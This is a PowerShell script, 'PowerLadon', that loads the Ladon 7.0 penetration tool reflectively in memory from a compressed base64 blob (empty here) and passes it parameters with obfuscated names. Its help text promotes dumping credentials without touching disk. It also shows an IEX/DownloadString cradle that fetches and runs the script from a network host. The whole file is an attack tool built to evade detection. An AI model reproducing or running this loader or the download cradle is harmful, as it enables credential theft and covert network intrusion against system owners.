#PowerLadon
function Ladon
{
<#
.SYNOPSIS

This script leverages Ladon 7.0 and Reflection.Assembly to reflectively load Ladon completely in memory. This allows you to do things such as
dump credentials without ever writing the Ladon binary to disk. 

Required Dependencies: Ladon (included)
Optional Dependencies: None
Ladon version: 7.0 (20200717)

.DESCRIPTION

Reflectively loads Ladon 7.0 in memory using PowerShell. Can be used to scan network without writing anything to disk. Can be used for any 
functionality provided with Ladon.

.TestON

Win7 x86  (Microsoft Windows [6.1.7601])
Win8 x64  (Microsoft Windows [6.2.9200])
Win10 x64 (Microsoft Windows [10.0.14393])

.EXAMPLE

Execute Ladon on the local computer to scan network OnlinePC.
Ladon OnlinePC
Ladon 192.168.1.8/24 OnlinePC


0x001 Cmd
powershell 
Import-Module .\Ladon.ps1
Ladon OnlinePC

0x002 Local
powershell Import-Module .\Ladon.ps1;Ladon OnlinePC

0x003 Remote
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"

#>
Param      
(       
[parameter(
#Mandatory = $true,
Position = 0
)]
$Q7MGIzea = "",
[parameter(
Position = 1
)]
$z9cZmQB = "",
[parameter(
Position = 2
)]
$z8kaB = "",
[parameter(
Position = 3
)]
$Kjeb3g = "",
[parameter(
Position = 4
)]
$z8vie = "",
[parameter(
Position = 5
)]
$rdX9D = "",
[parameter(
Position = 6
)]
$Df9Dd = "",
[parameter(
Position = 7
)]
$vbtpb = "",
[parameter(
Position = 8
)]
$bH8T3b
)

$kh89K =@'
'@
$8Hz8 = New-object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($kh89K),[IO.Compression.CompressionMode]::Decompress)
$S7B1p = New-object Byte[](949248)
$8Hz8.Read($S7B1p, 0, 949248) | Out-Null
$FkDM7 = [Reflection.Assembly]::Load($S7B1p).GetType('Ladon.Scan')
If([String]::IsNullOrEmpty($bH8T3b)){ If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" -and $vbtpb -ne ""  ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd,$vbtpb))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" -and $Df9Dd -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D,$Df9Dd))}else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" -and $rdX9D -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie,$rdX9D))} else{If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" -and $z8vie -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g,$z8vie))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" -and $Kjeb3g -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB,$Kjeb3g))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" -and $z8kaB -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$z8kaB))} else {If($Q7MGIzea -ne "" -and $z9cZmQB -ne "" ){$FkDM7::Main(@($Q7MGIzea,$z9cZmQB))}else {If($Q7MGIzea -ne "" ){$FkDM7::Main(@($Q7MGIzea))}}}}}}}}}
}